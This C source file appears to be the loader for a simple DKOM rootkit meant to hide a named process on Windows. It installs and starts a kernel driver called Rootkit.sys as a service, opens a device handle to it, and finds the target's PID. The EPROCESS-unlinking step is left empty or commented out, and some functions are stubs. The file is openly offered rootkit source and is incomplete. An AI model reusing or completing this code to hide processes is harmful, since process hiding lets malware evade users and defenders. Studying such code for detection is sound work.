
#include "loader.h"


#define SERVICE "Rootkit"
#define DEVICE "\\\\.\\Rootkit"
#define DRIVER "c:\\\\Windows\\System32\\drivers\\Rootkit.sys"



int call_kernel_driver(){
    printf("%s\n", "Calling Driver...");
}

BOOL load_driver(SC_HANDLE svcHandle) {

    printf("[*] Loading driver.\n");

    // Attempt to start the service
    if(StartService(svcHandle, 0, NULL) == 0) {

        // Check if error was due to the driver already running
        if (GetLastError() == ERROR_SERVICE_ALREADY_RUNNING) {

            printf("[!] Driver is already running.\n");
            return TRUE;

        } else {
            printf("[-] Error loading driver: %s \n", GetLastErrorAsString());
            return FALSE;
        }
    }

    printf("[+] Driver loaded.\n");
    return TRUE;
}

HANDLE install_driver() {

    // Declare variables
    SC_HANDLE hSCManager;   // Handle for SCM Database
    SC_HANDLE hService;     // Service handle 
    HANDLE hDevice;         // Device handle for our driver
    BOOLEAN b;              
    ULONG r;

    
    // Open a handle to the sc.exe service manager
    hSCManager = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);

    // Check the return value of our handle
    if (hSCManager == NULL) {
        printf("[-] Error opening handle to SCM Database: %s \n", GetLastErrorAsString());
        goto cleanup;
    }

    printf("[*] Grabbing driver device handle...\n");

    // Try to open a handle to our service
    hService = OpenService(hSCManager, TEXT(SERVICE), SERVICE_ALL_ACCESS); 

    // If it doesn't open successfully, try to create it as a new service
    if(hService == NULL) {


        printf("[!] Doesn't exist, installing new SCM entry...\n");

        // Check if it's because it isn't already installed
        if (GetLastError() == ERROR_SERVICE_DOES_NOT_EXIST) {

            // Create the service
            hService = CreateService 
            (
                hSCManager,
                TEXT(SERVICE),
                TEXT(SERVICE),
                SC_MANAGER_ALL_ACCESS,
                SERVICE_KERNEL_DRIVER,
                SERVICE_DEMAND_START,
                SERVICE_ERROR_IGNORE,
                TEXT(DRIVER),
                NULL, NULL, NULL, NULL, NULL
            );

            if (hService == NULL) {
                printf("[-] Error creating service: %s \n", GetLastErrorAsString());
                goto cleanup;
            }

        } else {
            printf("[-] Error opening service: %s \n", GetLastErrorAsString());
            goto cleanup;
        }
    
        printf("[+] SCM database entry added.\n");

        // Check if newly installed driver didn't load properly
        if(!load_driver(hService)){
            goto cleanup;
        }

    }

    // Open Device handle
    hDevice = CreateFile 
    (  
        TEXT(DEVICE),
        GENERIC_READ | GENERIC_WRITE,
        0,
        NULL,
        OPEN_EXISTING,
        FILE_ATTRIBUTE_NORMAL,
        NULL
    );

    // Check to ensure a valid handle
    if (hDevice == INVALID_HANDLE_VALUE) {
        printf("[-] Error creating handle: %s \n", GetLastErrorAsString());
        hDevice = NULL;
        goto cleanup;
    }

// Cleanup and return
// I debated a long time about the using a goto here, I didn't want to type the
// cleanup routine everytime I wanted to return after an error.
// Linus and Rik van Riel convinced me it was okay: 
// http://web.archive.org/web/20100211132600/http://kerneltrap.org/node/553/2131
// I guess memory cleanup and non-nested conditionals like we have above are 
// one of the only times using the notorious goto isn't a crime against humanity
cleanup: 
    CloseServiceHandle(hService);
    CloseServiceHandle(hSCManager);

    if(hDevice){
        return hDevice;
    }

    return NULL;

}



int main(int argc, char *argv[])
{

    // Device handle
    HANDLE hDevice; 

    // Usage
    if ( argc != 2) {
        printf("Usage Error: "
                "\nPlease provide a process to hide (ex. slack.exe)\n");
        exit(EXIT_FAILURE);
    }

    /*
    // Check privilages
    if (!IsElevated()) {
        printf("Exiting: The DKOM rootkit requires elevated privilages to hide a process.\n");
        return 1;
    } */

    // Banner
    printf("\n Basic DKOM Rootkit to Hide a Process\n"
             " Usage : loader.exe [process name]\n"
             " Author: Bradley Landherr\n\n");


    // Get the PID of the given process
    unsigned int pid = FindProcessId(argv[1]);

    // Exit if PID not found
    if (pid == 0) {
        exit(2);
    }


    printf("\n[+] Discovered PID of process %s: %d\n", argv[1], pid);

    // Lock access to EPROCESS list using the IRQL (Interrupt Request Level) approach
    
    //KIRQL irql;
    //PKDPC dpcPtr;
    //irql = RaiseIRQL();
    //dpcPtr = AquireLock();
    
    // Grab handle to our rootkit driver
    hDevice = install_driver();

    // Exit if there was an error
    if (hDevice == NULL) {
        exit(1);
    }

    printf("[+] Recieved driver handle.");
    //printf("[-] Could not lock EPROCESS list.");
    

    // Modify the EPROCESS list


    // Release access to the EPROCESS list and exit
    //ReleaseLock(dpcPtr);
    //LowerIRQL(irql); 

    CloseHandle(hDevice);
    return 0;
}